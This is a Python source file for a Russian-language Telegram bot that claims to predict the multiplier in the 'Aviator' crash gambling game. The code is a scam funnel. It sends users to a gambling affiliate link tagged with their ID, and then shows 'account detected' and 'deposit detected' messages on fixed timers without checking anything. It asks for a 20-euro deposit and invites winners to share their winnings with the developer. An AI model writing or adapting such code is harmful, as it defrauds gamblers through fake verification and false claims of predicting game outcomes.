import os
import re
import json
import asyncio
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    WebAppInfo,
)
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
)

# ===========================
# НАСТРОЙКИ
# ===========================

BOT_TOKEN = os.getenv("BOT_TOKEN")

LOG_CHAT_ID = -1003671787625       # чат для логов

BASE_APP_URL = "https://aviatorbot.up.railway.app/"

user_status = {}
USERS_FILE = "users.json"

# ===========================
# ЗАГРУЗКА И СОХРАНЕНИЕ СТАТУСОВ
# ===========================

def load_users():
    global user_status
    try:
        with open(USERS_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
            user_status = {int(k): v for k, v in data.items()}
        print(f"📂 Загружены пользователи из {USERS_FILE}: {user_status}")
    except Exception as e:
        print(f"⚠️ Не удалось загрузить {USERS_FILE}: {e}")
        user_status = {}

def save_users():
    try:
        with open(USERS_FILE, "w", encoding="utf-8") as f:
            json.dump({str(k): v for k, v in user_status.items()}, f, ensure_ascii=False, indent=2)
        print(f"💾 Статусы сохранены в {USERS_FILE}")
    except Exception as e:
        print(f"❌ Ошибка сохранения users.json: {e}")

# ===========================
# ЛОГИ
# ===========================

async def send_log(app: Application, text: str):
    try:
        await app.bot.send_message(chat_id=LOG_CHAT_ID, text=f"📡 LOG: {text}")
    except Exception as e:
        print(f"Ошибка логирования: {e}")

# ===========================
# УНИВЕРСАЛЬНОЕ INLINE-МЕНЮ
# ===========================

def menu_keyboard(user_id: int):
    status = user_status.get(user_id, "new")

    buttons = [
        [InlineKeyboardButton("📖 Инструкция к подключению и работе", callback_data="instruction")],
        [InlineKeyboardButton("🤖 Подключить бота", callback_data="connect")],
        [InlineKeyboardButton("💸 Стоимость", callback_data="price")],
        [InlineKeyboardButton(
            "🆘 Помощь",
            url="https://t.me/Dante_Valdes?text=Ciao!%20Ho%20una%20domanda%20sul%20bot"
        )],
    ]

    if status == "new":
        url = f"{BASE_APP_URL}?screen=noreg"
        label = "🔒 Открыть приложение (ожидаем регистрацию)"
    elif status == "registered":
        url = f"{BASE_APP_URL}?screen=nodep"
        label = "⏳ Открыть приложение (ожидаем депозит)"
    else:  # deposited
        url = BASE_APP_URL
        label = "🚀 Открыть приложение (доступ открыт)"

    buttons.append([InlineKeyboardButton(label, web_app=WebAppInfo(url=url))])

    return InlineKeyboardMarkup(buttons)

# ===========================
# /START
# ===========================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_status.setdefault(user_id, "new")
    save_users()

    await send_log(
        context.application,
        f"Пользователь {user_id} нажал /start (статус: {user_status[user_id]})"
    )

    await update.message.reply_text(
        "👋 Привет! Это главное меню бота.\n"
        "Все действия доступны в кнопках ниже 👇",
        reply_markup=menu_keyboard(user_id),
    )

# ===========================
# ФОНОВЫЕ ЗАДАЧИ (НЕ БЛОКИРУЮТ БОТА)
# ===========================

async def process_registration(app: Application, user_id: int):
    await asyncio.sleep(50)

    user_status[user_id] = "registered"
    save_users()

    await app.bot.send_message(
        chat_id=user_id,
        text="✅ Аккаунт обнаружен ботом! Теперь внеси депозит для подключения.\n"
             "Достаточно всего 20 евро, чтобы бот смог подключиться к аккаунту.",
        reply_markup=menu_keyboard(user_id),
    )

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("💰 Я ВНЕС ДЕПОЗИТ", callback_data="made_deposit")],
        [InlineKeyboardButton("⬅️ Назад в меню", callback_data="back_menu")]
    ])

    await app.bot.send_message(
        chat_id=user_id,
        text="Когда сделаешь депозит, нажми на кнопку для активации бота ✅",
        reply_markup=keyboard,
    )

    await send_log(app, f"✅ Статус {user_id} → registered")

async def process_deposit(app: Application, user_id: int):
    await asyncio.sleep(190)

    user_status[user_id] = "deposited"
    save_users()

    await app.bot.send_message(
        chat_id=user_id,
        text="🎉 Депозит обнаружен! Бот успешно подключен.\n"
             "Теперь можешь открывать приложение и начинать играть 🚀",
        reply_markup=menu_keyboard(user_id),
    )

    await send_log(app, f"💰 Статус {user_id} → deposited")

# ===========================
# ОБРАБОТКА INLINE-КНОПОК
# ===========================

async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    data = query.data

    await query.answer()
    status = user_status.get(user_id, "new")

    if data == "instruction":
        await query.edit_message_text(
            "1 - Подключение бота:\n"
            "Тебе нужно создать новый аккаунт и подождать около 1 минуты пока бот его обнаружит, "
            "потом внеси депозит и ожидай еще 2 минуты синхронизации бота. "
            "Бот подключен и готов к работе.\n\n"
            "2 - Использование бота:\n"
            "Как только начинается раунд - нажимай кнопку Мостра. "
            "Ты получишь коэффициент на котором самолет улетит в ЭТОМ раунде",
            reply_markup=menu_keyboard(user_id),
        )

    elif data == "connect":

        if status == "new":
            text = (
                "Когда создашь аккаунт на сайте, нажми на кнопку для подключения бота ✅\n\n"
                "--- [СОЗДАТЬ АККАУНТ](https://gembl.pro/click?o=705&a=1933&sub_id2={user_id}) ---"
            ).format(user_id=user_id)

            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("🟢 Я СОЗДАЛ АККАУНТ", callback_data="created_account")],
                [InlineKeyboardButton("⬅️ Назад в меню", callback_data="back_menu")]
            ])

            await query.edit_message_text(text, reply_markup=keyboard, parse_mode="Markdown")

        elif status == "registered":
            text = (
                "✅ Аккаунт найден ботом. Теперь внеси депозит для подключения.\n\n"
                "--- [ПРОДОЛЖИТЬ](https://gembl.pro/click?o=705&a=1933&sub_id2={user_id}) ---"
            ).format(user_id=user_id)

            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("💰 Я ВНЕС ДЕПОЗИТ", callback_data="made_deposit")],
                [InlineKeyboardButton("⬅️ Назад в меню", callback_data="back_menu")]
            ])

            await query.edit_message_text(text, reply_markup=keyboard, parse_mode="Markdown")

        else:  # deposited
            await query.edit_message_text(
                "✅ Бот подключен и готов к работе.",
                reply_markup=menu_keyboard(user_id),
            )

    elif data == "price":
        await query.edit_message_text(
            "Бот полностью бесплатный. Разработчик верит в добро и честность людей. "
            "Если ты захочешь поделиться частью своего выигрыша - напиши мне и я пришлю реквизиты для перевода",
            reply_markup=menu_keyboard(user_id),
        )

    elif data == "back_menu":
        await query.edit_message_text(
            "Главное меню 👇",
            reply_markup=menu_keyboard(user_id),
        )

    elif data == "created_account":
        await query.edit_message_text(
            "🔍 Бот ищет твой аккаунт, подожди 1-2 минуты. "
            "Когда аккаунт будет найден, ты получишь уведомление..."
        )

        await send_log(context.application, f"⏳ Пользователь {user_id} нажал: Я СОЗДАЛ АККАУНТ")

        asyncio.create_task(process_registration(context.application, user_id))

    elif data == "made_deposit":
        await query.edit_message_text(
            "🔄 Бот подключается к аккаунту, ожидайте 1-3 минуты..."
        )

        await send_log(context.application, f"⏳ Пользователь {user_id} нажал: Я ВНЕС ДЕПОЗИТ")

        asyncio.create_task(process_deposit(context.application, user_id))

# ===========================
# ЗАПУСК БОТА
# ===========================

def main():
    print("🚀 Бот запускается...")

    load_users()

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(menu_callback))

    print("✅ Bot started and running...")
    app.run_polling()

if __name__ == "__main__":
    main()
